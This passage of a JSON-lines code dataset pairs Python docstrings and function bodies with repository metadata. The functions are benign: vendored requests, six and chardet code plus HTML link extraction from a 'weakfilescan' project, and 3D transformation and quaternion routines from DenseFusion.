"stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Closes all adapters and as such the session\"\"\"\n", "func_signal": "def close(self):\n", "code": "for v in self.adapters.values():\n    v.close()", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Import module, returning the module after the last dot.\"\"\"\n", "func_signal": "def _import_module(name):\n", "code": "__import__(name)\nreturn sys.modules[name]", "path": "weakfilescan/libs/requests/packages/urllib3/packages/six.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Send a given PreparedRequest.\"\"\"\n# Set defaults that the hooks can utilize to ensure they always have\n# the correct parameters to reproduce the previous request.\n", "func_signal": "def send(self, request, **kwargs):\n", "code": "kwargs.setdefault('stream', self.stream)\nkwargs.setdefault('verify', self.verify)\nkwargs.setdefault('cert', self.cert)\nkwargs.setdefault('proxies', self.proxies)\n\n# It's possible that users might accidentally send a Request object.\n# Guard against that specific failure case.\nif not isinstance(request, PreparedRequest):\n    raise ValueError('You can only send PreparedRequests.')\n\nchecked_urls = set()\nwhile request.url in self.redirect_cache:\n    checked_urls.add(request.url)\n    new_url = self.redirect_cache.get(request.url)\n    if new_url in checked_urls:\n        break\n    request.url = new_url\n\n# Set up variables needed for resolve_redirects and dispatching of hooks\nallow_redirects = kwargs.pop('allow_redirects', True)\nstream = kwargs.get('stream')\ntimeout = kwargs.get('timeout')\nverify = kwargs.get('verify')\ncert = kwargs.get('cert')\nproxies = kwargs.get('proxies')\nhooks = request.hooks\n\n# Get the appropriate adapter to use\nadapter = self.get_adapter(url=request.url)\n\n# Start time (approximately) of the request\nstart = datetime.utcnow()\n\n# Send the request\nr = adapter.send(request, **kwargs)\n\n# Total elapsed time of the request (approximately)\nr.elapsed = datetime.utcnow() - start\n\n# Response manipulation hooks\nr = dispatch_hook('response', hooks, r, **kwargs)\n\n# Persist cookies\nif r.history:\n\n    # If the hooks create history then we want those cookies too\n    for resp in r.history:\n        extract_cookies_to_jar(self.cookies, resp.request, resp.raw)\n\nextract_cookies_to_jar(self.cookies, request, r.raw)\n\n# Redirect resolving generator.\ngen = self.resolve_redirects(r, request,\n    stream=stream,\n    timeout=timeout,\n    verify=verify,\n    cert=cert,\n    proxies=proxies)\n\n# Resolve redirects if allowed.\nhistory = [resp for resp in gen] if allow_redirects else []\n\n# Shuffle things around if there's history.\nif history:\n    # Insert the first (original) request at the start\n    history.insert(0, r)\n    # Get the last request made\n    r = history.pop()\n    r.history = history\n\nif not stream:\n    r.content\n\nreturn r", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "# \u5904\u7406script\u94fe\u63a5\u8d44\u6e90\n", "func_signal": "def get_tag_script(self):\n", "code": "for tag in self.soup.find_all('script'):\n\tif tag.attrs.has_key('src'):\n\t\tlink = tag.attrs['src']\n\t\tcomplet_link = self.complet_url(link.strip())\n\t\tif complet_link:\n\t\t\tself.url_links['script'].append(complet_link)\nreturn self.url_links", "path": "weakfilescan/common.py", "commit_date": "2015-04-04 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "# Remain active as long as any of the model probers are active.\n", "func_signal": "def get_state(self):\n", "code": "if (self._mLogicalProber.get_state() == eNotMe) and \\\n   (self._mVisualProber.get_state() == eNotMe):\n    return eNotMe\nreturn eDetecting", "path": "weakfilescan/libs/requests/packages/chardet/hebrewprober.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"\nWhen being redirected we may want to strip authentication from the\nrequest to avoid leaking credentials. This method intelligently removes\nand reapplies authentication where possible to avoid credential loss.\n\"\"\"\n", "func_signal": "def rebuild_auth(self, prepared_request, response):\n", "code": "headers = prepared_request.headers\nurl = prepared_request.url\n\nif 'Authorization' in headers:\n    # If we get redirected to a new host, we should strip out any\n    #\u00a0authentication headers.\n    original_parsed = urlparse(response.request.url)\n    redirect_parsed = urlparse(url)\n\n    if (original_parsed.hostname != redirect_parsed.hostname):\n        del headers['Authorization']\n\n# .netrc might have more auth for us on our new host.\nnew_auth = get_netrc_auth(url) if self.trust_env else None\nif new_auth is not None:\n    prepared_request.prepare_auth(new_auth)\n\nreturn", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"The new-style print function.\"\"\"\n", "func_signal": "def print_(*args, **kwargs):\n", "code": "fp = kwargs.pop(\"file\", sys.stdout)\nif fp is None:\n    return\ndef write(data):\n    if not isinstance(data, basestring):\n        data = str(data)\n    fp.write(data)\nwant_unicode = False\nsep = kwargs.pop(\"sep\", None)\nif sep is not None:\n    if isinstance(sep, unicode):\n        want_unicode = True\n    elif not isinstance(sep, str):\n        raise TypeError(\"sep must be None or a string\")\nend = kwargs.pop(\"end\", None)\nif end is not None:\n    if isinstance(end, unicode):\n        want_unicode = True\n    elif not isinstance(end, str):\n        raise TypeError(\"end must be None or a string\")\nif kwargs:\n    raise TypeError(\"invalid keyword arguments to print()\")\nif not want_unicode:\n    for arg in args:\n        if isinstance(arg, unicode):\n            want_unicode = True\n            break\nif want_unicode:\n    newline = unicode(\"\\n\")\n    space = unicode(\" \")\nelse:\n    newline = \"\\n\"\n    space = \" \"\nif sep is None:\n    sep = space\nif end is None:\n    end = newline\nfor i, arg in enumerate(args):\n    if i:\n        write(sep)\n    write(arg)\nwrite(end)", "path": "weakfilescan/libs/requests/packages/urllib3/packages/six.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Sends a GET request. Returns :class:`Response` object.\n\n:param url: URL for the new :class:`Request` object.\n:param \\*\\*kwargs: Optional arguments that ``request`` takes.\n\"\"\"\n\n", "func_signal": "def get(self, url, **kwargs):\n", "code": "kwargs.setdefault('allow_redirects', True)\nreturn self.request('GET', url, **kwargs)", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "# This is just one way to calculate confidence. It works well for me.\n", "func_signal": "def get_confidence(self):\n", "code": "if self._mTotalRel > MINIMUM_DATA_THRESHOLD:\n    return (self._mTotalRel - self._mRelSample[0]) / self._mTotalRel\nelse:\n    return DONT_KNOW", "path": "weakfilescan/libs/requests/packages/chardet/jpcntx.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"\nProperly merges both requests and session hooks.\n\nThis is necessary because when request_hooks == {'response': []}, the\nmerge breaks Session hooks entirely.\n\"\"\"\n", "func_signal": "def merge_hooks(request_hooks, session_hooks, dict_class=OrderedDict):\n", "code": "if session_hooks is None or session_hooks.get('response') == []:\n    return request_hooks\n\nif request_hooks is None or request_hooks.get('response') == []:\n    return session_hooks\n\nreturn merge_setting(request_hooks, session_hooks, dict_class)", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Remove item from six.moves.\"\"\"\n", "func_signal": "def remove_move(name):\n", "code": "try:\n    delattr(_MovedItems, name)\nexcept AttributeError:\n    try:\n        del moves.__dict__[name]\n    except KeyError:\n        raise AttributeError(\"no such move, %r\" % (name,))", "path": "weakfilescan/libs/requests/packages/urllib3/packages/six.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "# Final letter analysis for logical-visual decision.\n# Look for evidence that the received buffer is either logical Hebrew\n# or visual Hebrew.\n# The following cases are checked:\n# 1) A word longer than 1 letter, ending with a final letter. This is\n#    an indication that the text is laid out \"naturally\" since the\n#    final letter really appears at the end. +1 for logical score.\n# 2) A word longer than 1 letter, ending with a Non-Final letter. In\n#    normal Hebrew, words ending with Kaf, Mem, Nun, Pe or Tsadi,\n#    should not end with the Non-Final form of that letter. Exceptions\n#    to this rule are mentioned above in isNonFinal(). This is an\n#    indication that the text is laid out backwards. +1 for visual\n#    score\n# 3) A word longer than 1 letter, starting with a final letter. Final\n#    letters should not appear at the beginning of a word. This is an\n#    indication that the text is laid out backwards. +1 for visual\n#    score.\n#\n# The visual score and logical score are accumulated throughout the\n# text and are finally checked against each other in GetCharSetName().\n# No checking for final letters in the middle of words is done since\n# that case is not an indication for either Logical or Visual text.\n#\n# We automatically filter out all 7-bit characters (replace them with\n# spaces) so the word boundary detection works properly. [MAP]\n\n", "func_signal": "def feed(self, aBuf):\n", "code": "if self.get_state() == eNotMe:\n    # Both model probers say it's not them. No reason to continue.\n    return eNotMe\n\naBuf = self.filter_high_bit_only(aBuf)\n\nfor cur in aBuf:\n    if cur == ' ':\n        # We stand on a space - a word just ended\n        if self._mBeforePrev != ' ':\n            # next-to-last char was not a space so self._mPrev is not a\n            # 1 letter word\n            if self.is_final(self._mPrev):\n                # case (1) [-2:not space][-1:final letter][cur:space]\n                self._mFinalCharLogicalScore += 1\n            elif self.is_non_final(self._mPrev):\n                # case (2) [-2:not space][-1:Non-Final letter][\n                #  cur:space]\n                self._mFinalCharVisualScore += 1\n    else:\n        # Not standing on a space\n        if ((self._mBeforePrev == ' ') and\n                (self.is_final(self._mPrev)) and (cur != ' ')):\n            # case (3) [-2:space][-1:final letter][cur:not space]\n            self._mFinalCharVisualScore += 1\n    self._mBeforePrev = self._mPrev\n    self._mPrev = cur\n\n# Forever detecting, till the end or until both model probers return\n# eNotMe (handled above)\nreturn eDetecting", "path": "weakfilescan/libs/requests/packages/chardet/hebrewprober.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "# \u5904\u7406img\u94fe\u63a5\u8d44\u6e90\n", "func_signal": "def get_tag_img(self):\n", "code": "for tag in self.soup.find_all('img'):\n\tif tag.attrs.has_key('src'):\n\t\tlink = tag.attrs['src']\n\t\tcomplet_link = self.complet_url(link.strip())\n\t\tif complet_link:\n\t\t\tself.url_links['img'].append(complet_link)\nreturn self.url_links", "path": "weakfilescan/common.py", "commit_date": "2015-04-04 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n\n:param url: URL for the new :class:`Request` object.\n:param \\*\\*kwargs: Optional arguments that ``request`` takes.\n\"\"\"\n\n", "func_signal": "def options(self, url, **kwargs):\n", "code": "kwargs.setdefault('allow_redirects', True)\nreturn self.request('OPTIONS', url, **kwargs)", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "# \u5904\u7406link\u94fe\u63a5\u8d44\u6e90\n", "func_signal": "def get_tag_link(self):\n", "code": "for tag in self.soup.find_all('link'):\n\tif tag.attrs.has_key('href'):\n\t\tlink = tag.attrs['href']\n\t\tcomplet_link = self.complet_url(link.strip())\n\t\tif complet_link:\n\t\t\tself.url_links['link'].append(complet_link)\nreturn self.url_links", "path": "weakfilescan/common.py", "commit_date": "2015-04-04 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n:param url: URL for the new :class:`Request` object.\n:param \\*\\*kwargs: Optional arguments that ``request`` takes.\n\"\"\"\n\n", "func_signal": "def head(self, url, **kwargs):\n", "code": "kwargs.setdefault('allow_redirects', False)\nreturn self.request('HEAD', url, **kwargs)", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Returns the appropriate connnection adapter for the given URL.\"\"\"\n", "func_signal": "def get_adapter(self, url):\n", "code": "for (prefix, adapter) in self.adapters.items():\n\n    if url.lower().startswith(prefix):\n        return adapter\n\n# Nothing matches :-/\nraise InvalidSchema(\"No connection adapters were found for '%s'\" % url)", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "# Make the decision: is it Logical or Visual?\n# If the final letter score distance is dominant enough, rely on it.\n", "func_signal": "def get_charset_name(self):\n", "code": "finalsub = self._mFinalCharLogicalScore - self._mFinalCharVisualScore\nif finalsub >= MIN_FINAL_CHAR_DISTANCE:\n    return LOGICAL_HEBREW_NAME\nif finalsub <= -MIN_FINAL_CHAR_DISTANCE:\n    return VISUAL_HEBREW_NAME\n\n# It's not dominant enough, try to rely on the model scores instead.\nmodelsub = (self._mLogicalProber.get_confidence()\n            - self._mVisualProber.get_confidence())\nif modelsub > MIN_MODEL_DISTANCE:\n    return LOGICAL_HEBREW_NAME\nif modelsub < -MIN_MODEL_DISTANCE:\n    return VISUAL_HEBREW_NAME\n\n# Still no good, back to final letter distance, maybe it'll save the\n# day.\nif finalsub < 0.0:\n    return VISUAL_HEBREW_NAME\n\n# (finalsub > 0 - Logical) or (don't know what to do) default to\n# Logical.\nreturn LOGICAL_HEBREW_NAME", "path": "weakfilescan/libs/requests/packages/chardet/hebrewprober.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Constructs a :class:`PreparedRequest <PreparedRequest>` for\ntransmission and returns it. The :class:`PreparedRequest` has settings\nmerged from the :class:`Request <Request>` instance and those of the\n:class:`Session`.\n\n:param request: :class:`Request` instance to prepare with this\n    session's settings.\n\"\"\"\n", "func_signal": "def prepare_request(self, request):\n", "code": "cookies = request.cookies or {}\n\n# Bootstrap CookieJar.\nif not isinstance(cookies, cookielib.CookieJar):\n    cookies = cookiejar_from_dict(cookies)\n\n# Merge with session cookies\nmerged_cookies = merge_cookies(\n    merge_cookies(RequestsCookieJar(), self.cookies), cookies)\n\n\n# Set environment's basic authentication if not explicitly set.\nauth = request.auth\nif self.trust_env and not auth and not self.auth:\n    auth = get_netrc_auth(request.url)\n\np = PreparedRequest()\np.prepare(\n    method=request.method.upper(),\n    url=request.url,\n    files=request.files,\n    data=request.data,\n    json=request.json,\n    headers=merge_setting(request.headers, self.headers, dict_class=CaseInsensitiveDict),\n    params=merge_setting(request.params, self.params),\n    auth=merge_setting(auth, self.auth),\n    cookies=merged_cookies,\n    hooks=merge_hooks(request.hooks, self.hooks),\n)\nreturn p", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", "stars": 1115, "license": "None", "language": "python", "size": 513}
{"docstring": "\"\"\"Return homogeneous rotation matrix from Euler angles and axis sequence.\n\nai, aj, ak : Euler's roll, pitch and yaw angles\naxes : One of 24 axis sequences as string or encoded tuple\n\n>>> R = euler_matrix(1, 2, 3, 'syxz')\n>>> numpy.allclose(numpy.sum(R[0]), -1.34786452)\nTrue\n>>> R = euler_matrix(1, 2, 3, (0, 1, 0, 1))\n>>> numpy.allclose(numpy.sum(R[0]), -0.383436184)\nTrue\n>>> ai, aj, ak = (4*math.pi) * (numpy.random.random(3) - 0.5)\n>>> for axes in _AXES2TUPLE.keys():\n...    R = euler_matrix(ai, aj, ak, axes)\n>>> for axes in _TUPLE2AXES.keys():\n...    R = euler_matrix(ai, aj, ak, axes)\n\n\"\"\"\n", "func_signal": "def euler_matrix(ai, aj, ak, axes='sxyz'):\n", "code": "try:\n    firstaxis, parity, repetition, frame = _AXES2TUPLE[axes]\nexcept (AttributeError, KeyError):\n    _TUPLE2AXES[axes]  # validation\n    firstaxis, parity, repetition, frame = axes\n\ni = firstaxis\nj = _NEXT_AXIS[i+parity]\nk = _NEXT_AXIS[i-parity+1]\n\nif frame:\n    ai, ak = ak, ai\nif parity:\n    ai, aj, ak = -ai, -aj, -ak\n\nsi, sj, sk = math.sin(ai), math.sin(aj), math.sin(ak)\nci, cj, ck = math.cos(ai), math.cos(aj), math.cos(ak)\ncc, cs = ci*ck, ci*sk\nsc, ss = si*ck, si*sk\n\nM = numpy.identity(4)\nif repetition:\n    M[i, i] = cj\n    M[i, j] = sj*si\n    M[i, k] = sj*ci\n    M[j, i] = sj*sk\n    M[j, j] = -cj*ss+cc\n    M[j, k] = -cj*cs-sc\n    M[k, i] = -sj*ck\n    M[k, j] = cj*sc+cs\n    M[k, k] = cj*cc-ss\nelse:\n    M[i, i] = cj*ck\n    M[i, j] = sj*sc-cs\n    M[i, k] = sj*cc+ss\n    M[j, i] = cj*sk\n    M[j, j] = sj*ss+cc\n    M[j, k] = sj*cs-sc\n    M[k, i] = -sj\n    M[k, j] = cj*si\n    M[k, k] = cj*ci\nreturn M", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return shear angle, direction and plane from shear matrix.\n\n>>> angle = (random.random() - 0.5) * 4*math.pi\n>>> direct = numpy.random.random(3) - 0.5\n>>> point = numpy.random.random(3) - 0.5\n>>> normal = numpy.cross(direct, numpy.random.random(3))\n>>> S0 = shear_matrix(angle, direct, point, normal)\n>>> angle, direct, point, normal = shear_from_matrix(S0)\n>>> S1 = shear_matrix(angle, direct, point, normal)\n>>> is_same_transform(S0, S1)\nTrue\n\n\"\"\"\n", "func_signal": "def shear_from_matrix(matrix):\n", "code": "M = numpy.array(matrix, dtype=numpy.float64, copy=False)\nM33 = M[:3, :3]\n# normal: cross independent eigenvectors corresponding to the eigenvalue 1\nw, V = numpy.linalg.eig(M33)\ni = numpy.where(abs(numpy.real(w) - 1.0) < 1e-4)[0]\nif len(i) < 2:\n    raise ValueError('no two linear independent eigenvectors found %s' % w)\nV = numpy.real(V[:, i]).squeeze().T\nlenorm = -1.0\nfor i0, i1 in ((0, 1), (0, 2), (1, 2)):\n    n = numpy.cross(V[i0], V[i1])\n    w = vector_norm(n)\n    if w > lenorm:\n        lenorm = w\n        normal = n\nnormal /= lenorm\n# direction and angle\ndirection = numpy.dot(M33 - numpy.identity(3), normal)\nangle = vector_norm(direction)\ndirection /= angle\nangle = math.atan(angle)\n# point: eigenvector corresponding to eigenvalue 1\nw, V = numpy.linalg.eig(M)\ni = numpy.where(abs(numpy.real(w) - 1.0) < 1e-8)[0]\nif not len(i):\n    raise ValueError('no eigenvector corresponding to eigenvalue 1')\npoint = numpy.real(V[:, i[-1]]).squeeze()\npoint /= point[3]\nreturn angle, direction, point, normal", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return multiplication of two quaternions.\n\n>>> q = quaternion_multiply([4, 1, -2, 3], [8, -5, 6, 7])\n>>> numpy.allclose(q, [28, -44, -14, 48])\nTrue\n\n\"\"\"\n", "func_signal": "def quaternion_multiply(quaternion1, quaternion0):\n", "code": "w0, x0, y0, z0 = quaternion0\nw1, x1, y1, z1 = quaternion1\nreturn numpy.array([\n    -x1*x0 - y1*y0 - z1*z0 + w1*w0,\n    x1*w0 + y1*z0 - z1*y0 + w1*x0,\n    -x1*z0 + y1*w0 + z1*x0 + w1*y0,\n    x1*y0 - y1*x0 + z1*w0 + w1*z0], dtype=numpy.float64)", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Update current cursor window coordinates.\"\"\"\n", "func_signal": "def drag(self, point):\n", "code": "vnow = arcball_map_to_sphere(point, self._center, self._radius)\nif self._axis is not None:\n    vnow = arcball_constrain_to_axis(vnow, self._axis)\nself._qpre = self._qnow\nt = numpy.cross(self._vdown, vnow)\nif numpy.dot(t, t) < _EPS:\n    self._qnow = self._qdown\nelse:\n    q = [numpy.dot(self._vdown, vnow), t[0], t[1], t[2]]\n    self._qnow = quaternion_multiply(q, self._qdown)", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return matrix to obtain normalized device coordinates from frustum.\n\nThe frustum bounds are axis-aligned along x (left, right),\ny (bottom, top) and z (near, far).\n\nNormalized device coordinates are in range [-1, 1] if coordinates are\ninside the frustum.\n\nIf perspective is True the frustum is a truncated pyramid with the\nperspective point at origin and direction along z axis, otherwise an\northographic canonical view volume (a box).\n\nHomogeneous coordinates transformed by the perspective clip matrix\nneed to be dehomogenized (divided by w coordinate).\n\n>>> frustum = numpy.random.rand(6)\n>>> frustum[1] += frustum[0]\n>>> frustum[3] += frustum[2]\n>>> frustum[5] += frustum[4]\n>>> M = clip_matrix(perspective=False, *frustum)\n>>> numpy.dot(M, [frustum[0], frustum[2], frustum[4], 1])\narray([-1., -1., -1.,  1.])\n>>> numpy.dot(M, [frustum[1], frustum[3], frustum[5], 1])\narray([ 1.,  1.,  1.,  1.])\n>>> M = clip_matrix(perspective=True, *frustum)\n>>> v = numpy.dot(M, [frustum[0], frustum[2], frustum[4], 1])\n>>> v / v[3]\narray([-1., -1., -1.,  1.])\n>>> v = numpy.dot(M, [frustum[1], frustum[3], frustum[4], 1])\n>>> v / v[3]\narray([ 1.,  1., -1.,  1.])\n\n\"\"\"\n", "func_signal": "def clip_matrix(left, right, bottom, top, near, far, perspective=False):\n", "code": "if left >= right or bottom >= top or near >= far:\n    raise ValueError('invalid frustum')\nif perspective:\n    if near <= _EPS:\n        raise ValueError('invalid frustum: near <= 0')\n    t = 2.0 * near\n    M = [[t/(left-right), 0.0, (right+left)/(right-left), 0.0],\n         [0.0, t/(bottom-top), (top+bottom)/(top-bottom), 0.0],\n         [0.0, 0.0, (far+near)/(near-far), t*far/(far-near)],\n         [0.0, 0.0, -1.0, 0.0]]\nelse:\n    M = [[2.0/(right-left), 0.0, 0.0, (right+left)/(left-right)],\n         [0.0, 2.0/(top-bottom), 0.0, (top+bottom)/(bottom-top)],\n         [0.0, 0.0, 2.0/(far-near), (far+near)/(near-far)],\n         [0.0, 0.0, 0.0, 1.0]]\nreturn numpy.array(M)", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Set axes to constrain rotations.\"\"\"\n", "func_signal": "def setaxes(self, *axes):\n", "code": "if axes is None:\n    self._axes = None\nelse:\n    self._axes = [unit_vector(axis) for axis in axes]", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return True if two quaternions are equal.\"\"\"\n", "func_signal": "def is_same_quaternion(q0, q1):\n", "code": "q0 = numpy.array(q0)\nq1 = numpy.array(q1)\nreturn numpy.allclose(q0, q1) or numpy.allclose(q0, -q1)", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return quaternion for rotation about axis.\n\n>>> q = quaternion_about_axis(0.123, [1, 0, 0])\n>>> numpy.allclose(q, [0.99810947, 0.06146124, 0, 0])\nTrue\n\n\"\"\"\n", "func_signal": "def quaternion_about_axis(angle, axis):\n", "code": "q = numpy.array([0.0, axis[0], axis[1], axis[2]])\nqlen = vector_norm(q)\nif qlen > _EPS:\n    q *= math.sin(angle/2.0) / qlen\nq[0] = math.cos(angle/2.0)\nreturn q", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return homogeneous rotation matrix from quaternion.\n\n>>> M = quaternion_matrix([0.99810947, 0.06146124, 0, 0])\n>>> numpy.allclose(M, rotation_matrix(0.123, [1, 0, 0]))\nTrue\n>>> M = quaternion_matrix([1, 0, 0, 0])\n>>> numpy.allclose(M, numpy.identity(4))\nTrue\n>>> M = quaternion_matrix([0, 1, 0, 0])\n>>> numpy.allclose(M, numpy.diag([1, -1, -1, 1]))\nTrue\n\n\"\"\"\n", "func_signal": "def quaternion_matrix(quaternion):\n", "code": "q = numpy.array(quaternion, dtype=numpy.float64, copy=True)\nn = numpy.dot(q, q)\nif n < _EPS:\n    return numpy.identity(4)\nq *= math.sqrt(2.0 / n)\nq = numpy.outer(q, q)\nreturn numpy.array([\n    [1.0-q[2, 2]-q[3, 3],     q[1, 2]-q[3, 0],     q[1, 3]+q[2, 0], 0.0],\n    [    q[1, 2]+q[3, 0], 1.0-q[1, 1]-q[3, 3],     q[2, 3]-q[1, 0], 0.0],\n    [    q[1, 3]-q[2, 0],     q[2, 3]+q[1, 0], 1.0-q[1, 1]-q[2, 2], 0.0],\n    [                0.0,                 0.0,                 0.0, 1.0]])", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return matrix to shear by angle along direction vector on shear plane.\n\nThe shear plane is defined by a point and normal vector. The direction\nvector must be orthogonal to the plane's normal vector.\n\nA point P is transformed by the shear matrix into P\" such that\nthe vector P-P\" is parallel to the direction vector and its extent is\ngiven by the angle of P-P'-P\", where P' is the orthogonal projection\nof P onto the shear plane.\n\n>>> angle = (random.random() - 0.5) * 4*math.pi\n>>> direct = numpy.random.random(3) - 0.5\n>>> point = numpy.random.random(3) - 0.5\n>>> normal = numpy.cross(direct, numpy.random.random(3))\n>>> S = shear_matrix(angle, direct, point, normal)\n>>> numpy.allclose(1, numpy.linalg.det(S))\nTrue\n\n\"\"\"\n", "func_signal": "def shear_matrix(angle, direction, point, normal):\n", "code": "normal = unit_vector(normal[:3])\ndirection = unit_vector(direction[:3])\nif abs(numpy.dot(normal, direction)) > 1e-6:\n    raise ValueError('direction and normal vectors are not orthogonal')\nangle = math.tan(angle)\nM = numpy.identity(4)\nM[:3, :3] += angle * numpy.outer(direction, normal)\nM[:3, 3] = -angle * numpy.dot(point[:3], normal) * direction\nreturn M", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return conjugate of quaternion.\n\n>>> q0 = random_quaternion()\n>>> q1 = quaternion_conjugate(q0)\n>>> q1[0] == q0[0] and all(q1[1:] == -q0[1:])\nTrue\n\n\"\"\"\n", "func_signal": "def quaternion_conjugate(quaternion):\n", "code": "q = numpy.array(quaternion, dtype=numpy.float64, copy=True)\nnumpy.negative(q[1:], q[1:])\nreturn q", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return length, i.e. Euclidean norm, of ndarray along axis.\n\n>>> v = numpy.random.random(3)\n>>> n = vector_norm(v)\n>>> numpy.allclose(n, numpy.linalg.norm(v))\nTrue\n>>> v = numpy.random.rand(6, 5, 3)\n>>> n = vector_norm(v, axis=-1)\n>>> numpy.allclose(n, numpy.sqrt(numpy.sum(v*v, axis=2)))\nTrue\n>>> n = vector_norm(v, axis=1)\n>>> numpy.allclose(n, numpy.sqrt(numpy.sum(v*v, axis=1)))\nTrue\n>>> v = numpy.random.rand(5, 4, 3)\n>>> n = numpy.empty((5, 3))\n>>> vector_norm(v, axis=1, out=n)\n>>> numpy.allclose(n, numpy.sqrt(numpy.sum(v*v, axis=1)))\nTrue\n>>> vector_norm([])\n0.0\n>>> vector_norm([1])\n1.0\n\n\"\"\"\n", "func_signal": "def vector_norm(data, axis=None, out=None):\n", "code": "data = numpy.array(data, dtype=numpy.float64, copy=True)\nif out is None:\n    if data.ndim == 1:\n        return math.sqrt(numpy.dot(data, data))\n    data *= data\n    out = numpy.atleast_1d(numpy.sum(data, axis=axis))\n    numpy.sqrt(out, out)\n    return out\nelse:\n    data *= data\n    numpy.sum(data, axis=axis, out=out)\n    numpy.sqrt(out, out)", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
